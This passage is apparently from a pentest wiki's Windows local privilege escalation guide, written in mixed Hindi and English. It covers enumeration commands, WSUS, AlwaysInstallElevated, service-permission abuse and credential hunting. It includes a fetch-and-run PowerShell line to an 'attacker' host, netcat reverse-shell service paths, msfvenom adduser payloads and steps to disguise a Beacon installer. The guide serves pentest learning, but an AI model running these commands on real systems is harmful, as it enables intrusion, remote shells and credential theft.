# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्नलिखित पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या होते हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows सुरक्षा नियंत्रण

Windows में विभिन्न चीज़ें मौजूद हैं जो आपको **prevent you from enumerating the system**, executables चलाने से रोक सकती हैं या यहाँ तक कि आपकी गतिविधियों को **detect your activities** कर सकती हैं। आपको privilege escalation enumeration शुरू करने से पहले निम्नलिखित पृष्ठ को पढ़कर इन सभी **defenses mechanisms** को **enumerate** करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes launched through `RAiLaunchAdminProcess` का दुरुपयोग करके, जब AppInfo secure-path checks bypass हो जाते हैं, तो prompts के बिना High IL तक पहुँचने के लिए इस्तेमाल किया जा सकता है। समर्पित UIAccess/Admin Protection bypass workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग arbitrary SYSTEM registry write (RegPwn) के लिए किया जा सकता है:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## सिस्टम जानकारी

### Version info enumeration

जाँचें कि क्या Windows version में कोई ज्ञात vulnerability है (लागू किए गए patches भी जांचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft की सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा कमजोरियाँ हैं, जो Windows environment द्वारा प्रस्तुत **विशाल हमले की सतह** को दर्शाती हैं।

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या कोई credential/Juicy info env variables में saved है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell ट्रांसक्रिप्ट फ़ाइलें

आप यह जान सकते हैं कि इसे कैसे चालू करें: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन के निष्पादन का विवरण रिकॉर्ड किया जाता है — इसमें निष्पादित कमांड, कमांड कॉल और स्क्रिप्ट के हिस्से शामिल होते हैं। हालांकि, पूरा निष्पादन विवरण और आउटपुट परिणाम हमेशा कैप्चर नहीं होते।

इसे सक्षम करने के लिए, दस्तावेज़ीकरण के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें और **"Module Logging"** का चयन करें **"Powershell Transcription"** के स्थान पर।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से अंतिम 15 घटनाएँ देखने के लिए आप निम्नलिखित कमांड चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की संपूर्ण गतिविधि और पूर्ण सामग्री का रिकॉर्ड कैप्चर किया जाता है, जिससे यह सुनिश्चित होता है कि कोड का हर ब्लॉक चलने के समय दस्तावेजीकृत हो। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक ऑडिट ट्रेल संरक्षित करती है, जो forensics और malicious behavior के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों को दस्तावेज़ करके, प्रक्रिया के बारे में विस्तृत अंतर्दृष्टि प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लिए लॉगिंग घटनाएँ Windows Event Viewer में इस पथ पर पाई जा सकती हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
आखिरी 20 घटनाएँ देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट http**S** के बजाय http का उपयोग करके अनुरोध किए जाते हैं, तो आप सिस्टम को compromise कर सकते हैं।

आप यह जांचकर शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग कर रहा है या नहीं, cmd में निम्नलिखित चलाकर:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से कोई उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
और अगर `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` बराबर `1` है।

Then, **it is exploitable.** अगर आखिरी registry की value `0` है, तो WSUS entry नजरअंदाज किया जाएगा।

In order to exploit this vulnerabilities आप निम्न टूल्स का उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, यह वह flaw है जिसका यह bug फायदा उठाता है:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

आप इस vulnerability का exploit कर सकते हैं tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) का उपयोग करके (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई enterprise agents एक localhost IPC surface और एक privileged update channel expose करते हैं। यदि enrollment को attacker server की ओर जोर देकर भेजा जा सके और updater किसी rogue root CA या कमजोर signer checks पर भरोसा करे, तो एक local user एक malicious MSI पहुंचा सकता है जिसे SYSTEM service इंस्टॉल कर देता है। सामान्यीकृत तकनीक देखें (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` एक localhost service **TCP/9401** पर expose करता है जो attacker-controlled messages को process करता है, जिससे arbitrary commands **NT AUTHORITY\SYSTEM** के रूप में चलाए जा सकते हैं।

- **Recon**: listener और version की पुष्टि करें, उदाहरण के लिए `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: उसी directory में आवश्यक Veeam DLLs के साथ `VeeamHax.exe` जैसे PoC रखें, फिर local socket पर SYSTEM payload trigger करें:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
सेवा कमांड को SYSTEM के रूप में निष्पादित करती है।

## KrbRelayUp

Windows के **domain** environments में कुछ विशेष परिस्थितियों के तहत एक **local privilege escalation** vulnerability मौजूद है। इन परिस्थितियों में वे environments शामिल हैं जहाँ **LDAP signing is not enforced,** उपयोगकर्ताओं के पास self-rights होते हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** को कॉन्फ़िगर करने की अनुमति देते हैं, और उपयोगकर्ताओं के पास domain में कंप्यूटर बनाने की क्षमता होती है। यह ध्यान देने योग्य है कि ये **requirements** **default settings** के साथ मेल खाते हैं।

Find the **exploit in** [https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**यदि** ये 2 रजिस्ट्री प्रविष्टियाँ **सक्रिय** हैं (मान **0x1**), तो किसी भी विशेषाधिकार वाले उपयोगकर्ता NT AUTHORITY\\**SYSTEM** के रूप में `*.msi` फ़ाइलें **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक meterpreter session है, तो आप इस technique को module **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं।

### PowerUP

power-up के `Write-UserAddMSI` कमांड का उपयोग करें ताकि वर्तमान निर्देशिका के अंदर एक Windows MSI binary बनाया जा सके जो privileges escalate करे। यह script एक precompiled MSI installer लिखता है जो user/group जोड़ने के लिए prompt करता है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
बस बनाए गए binary को चलाकर privileges बढ़ाएँ।

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX के साथ MSI बनाएँ


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio के साथ MSI बनाएँ

- **Cobalt Strike** या **Metasploit** के साथ `C:\privesc\beacon.exe` में एक नया **Windows EXE TCP payload** जनरेट करें
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट का नाम दें, जैसे **AlwaysPrivesc**, लोकेशन के लिए **`C:\privesc`** इस्तेमाल करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक कि आप step 3 of 4 (choose files to include) पर न पहुँच जाएँ। **Add** पर क्लिक करें और अभी जो Beacon payload आपने जनरेट किया उसे चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- अन्य properties भी हैं जिन्हें आप बदल सकते हैं, जैसे **Author** और **Manufacturer**, जिससे installed app अधिक legitimate दिख सकता है।
- प्रोजेक्ट पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। इससे सुनिश्चित होगा कि जैसे ही installer चलता है, beacon payload executed हो जाएगा।
- **Custom Action Properties** के अंतर्गत, **Run64Bit** को **True** पर सेट करें।
- अंत में, इसे **build** करें।
- यदि warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

दुर्भावनापूर्ण `.msi` फ़ाइल की **installation** को **background** में execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability का exploit करने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर्स

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए।
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** स्थानीय Administrator passwords के **management** के लिए डिज़ाइन किया गया है, यह सुनिश्चित करते हुए कि प्रत्येक password **अद्वितीय, यादृच्छिक, और नियमित रूप से अपडेट** किया जाए उन कंप्यूटरों पर जो domain से जुड़े हों। ये passwords सुरक्षित रूप से Active Directory में संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त permissions दिए गए हों, जिससे उन्हें स्थानीय admin passwords देखने की अनुमति मिलती है अगर अधिकृत हों।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, **plain-text passwords LSASS** (Local Security Authority Subsystem Service) में स्टोर होते हैं।\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा लागू की, ताकि untrusted processes द्वारा **read its memory** करने या code inject करने के प्रयासों को **block** किया जा सके, जिससे सिस्टम और सुरक्षित हो।\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** की शुरुआत **Windows 10** में हुई थी। इसका उद्देश्य डिवाइस पर स्टोर किए गए credentials को pass-the-hash attacks जैसे खतरों से सुरक्षित रखना है।| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम के घटक इन्हें उपयोग करते हैं। जब किसी उपयोगकर्ता का logon data किसी registered security package द्वारा प्रमाणित होता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित हो जाते हैं.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों की सूची

आपको यह जांचना चाहिए कि क्या जिन समूहों के आप सदस्य हैं उनमें कोई रोचक अनुमतियाँ हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

यदि आप **किसी privileged group के सदस्य हैं तो आप privileges escalate कर सकते हैं**। यहाँ privileged groups और उन्हें abuse करके privileges escalate करने के तरीके जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**और जानें** कि एक **token** क्या है इस पेज पर: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ देखें ताकि आप **दिलचस्प tokens के बारे में जान सकें** और उन्हें कैसे abuse किया जा सकता है:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रहे प्रोसेस

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाओं की सूची बनाते समय **प्रोसेस की command line में पासवर्ड्स देखें**.\
जाँचें कि क्या आप किसी चल रहे binary को **overwrite** कर सकते हैं या क्या आपके पास binary फ़ोल्डर की write permissions हैं ताकि संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का फायदा उठाया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) की जाँच करें.

**प्रोसेस बाइनरीज़ के permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फ़ोल्डरों की अनुमतियों की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप sysinternals के **procdump** का उपयोग करके किसी running process की memory dump बना सकते हैं। FTP जैसी services में **credentials in clear text in memory** होते हैं — memory को dump करके credentials पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाली Applications उपयोगकर्ता को CMD spawn करने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकती हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर क्लिक करें

## Services

Service Triggers Windows को तब service शुरू करने देते हैं जब कुछ शर्तें पूरी होती हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। भले ही आपके पास SERVICE_START rights न हों, आप अक्सर उनके triggers को सक्रिय करके privileged services को शुरू कर सकते हैं। enumeration and activation techniques के लिए यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

सर्विसेज़ की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी service के बारे में जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं।
```bash
sc qc <service_name>
```
यह सलाह दी जाती है कि प्रत्येक सेवा के लिए आवश्यक privilege level जांचने के लिए _Sysinternals_ का binary **accesschk** मौजूद हो।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
अनुशंसित है कि जांचें कि "Authenticated Users" किसी भी service को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप XP के लिए accesschk.exe यहाँ से डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सर्विस सक्षम करें

यदि आप यह त्रुटि देख रहे हैं (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

इसे सक्षम करने के लिए आप निम्न का उपयोग कर सकते हैं:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान दें कि सेवा upnphost काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**एक और workaround** इस समस्या के लिए यह है कि चलाएँ:
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी पाथ संशोधित करें**

ऐसे परिदृश्य में जहाँ "Authenticated users" समूह को किसी सर्विस पर **SERVICE_ALL_ACCESS** प्राप्त है, उस सर्विस के निष्पादन योग्य बाइनरी में परिवर्तन संभव है। **sc** को संशोधित और निष्पादित करने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
विभिन्न अनुमतियों के माध्यम से अधिकार बढ़ाए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: सर्विस बाइनरी को पुनः कॉन्फ़िगर करने की अनुमति देता है।
- **WRITE_DAC**: अनुमतियों को पुनः कॉन्फ़िगर करने में सक्षम बनाता है, जिससे सर्विस कॉन्फ़िगरेशन बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: स्वामित्व प्राप्त करने और अनुमतियों को पुनः कॉन्फ़िगर करने की अनुमति देता है।
- **GENERIC_WRITE**: सर्विस कॉन्फ़िगरेशन बदलने की क्षमता इसमें शामिल होती है।
- **GENERIC_ALL**: इसमें भी सर्विस कॉन्फ़िगरेशन बदलने की क्षमता शामिल होती है।

इस कमजोरियों का पता लगाने और शोषण करने के लिए _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries weak permissions

**Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप किसी सर्विस द्वारा निष्पादित प्रत्येक बाइनरी को **wmic** (not in system32) का उपयोग करके प्राप्त कर सकते हैं और अपनी अनुमतियाँ **icacls** का उपयोग करके जाँच सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

आपको यह जांचना चाहिए कि क्या आप किसी भी service registry को संशोधित कर सकते हैं.\
आप निम्नलिखित करके किसी service **registry** पर अपनी **permissions** **check** कर सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जांचा जाना चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं। अगर ऐसा है, तो service द्वारा execute किए जाने वाले binary को बदला जा सकता है।

Execute किए जाने वाले binary का Path बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race के जरिए किसी भी HKLM वैल्यू में लिखना (ATConfig)

कुछ Windows Accessibility फीचर per-user **ATConfig** keys बनाते हैं जिन्हें बाद में एक **SYSTEM** प्रोसेस HKLM session key में कॉपी करता है। एक registry **symbolic link race** उस privileged write को **किसी भी HKLM path** पर redirect कर सकता है, जिससे arbitrary HKLM **value write** primitive मिल जाता है।

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` इंस्टॉल किए गए accessibility फीचर्स को सूचीबद्ध करता है।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` उपयोगकर्ता-नियंत्रित कॉन्फ़िगरेशन संग्रहीत करता है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` लॉगऑन/secure-desktop transitions के दौरान बनाया जाता है और यह उपयोगकर्ता द्वारा writable होता है।

